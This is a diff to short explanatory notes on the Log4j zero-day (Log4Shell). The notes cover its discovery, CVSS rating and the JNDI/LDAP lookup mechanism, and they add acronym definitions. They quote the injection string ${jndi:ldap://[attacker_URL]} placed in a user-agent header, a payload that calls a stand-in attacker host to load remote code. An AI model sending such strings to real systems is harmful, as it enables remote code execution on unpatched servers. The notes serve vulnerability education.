@@ -1,4 +1,5 @@
                                                                    Log4j zero-day vulnerability
+                                                                 *********************************
    https://www.prplbx.com/resources/blog/log4j/
 
    
@@ -6,7 +7,7 @@
    This vulnerability was discovered by Chen Zhaojun of the Alibaba Cloud Security Team on December 9th, 2021. 
    As per the Common Vulnerability Scoring System or CVSS, Apache team ranked the vulnerability as 10.
    
-   This vulnerability allows unauthenticated RCE(Remote Code Execution). 
+   This vulnerability allows unauthenticated RCE(Remote Code Execution) with JNDI & LDAP in Log4j. 
    Attackers can take advantage of it by modifying their browser's user-agent string to ${jndi:ldap://[attacker_URL]} format.
    An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. 
    JNDI allows programmers to look up items using a variety of services and protocols, including LDAP, DNS, Java Remote Method Invocation (RMI), and others.
@@ -15,7 +16,10 @@
   
   
   
-  CVE stand for Common Vulnerabilities and Exposures. CVE provides a free dictionary for organizations to improve their cyber security. 
+  CVE - Common Vulnerabilities and Exposures. CVE provides a free dictionary for organizations to improve their cyber security.
+  JNDI - Java Naming and Directory Interface.
+  LDAP - Lightweight Directory Access Protocol.
+  
   Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.
   
   What is this & way to mitigate(reducing to make less harm)
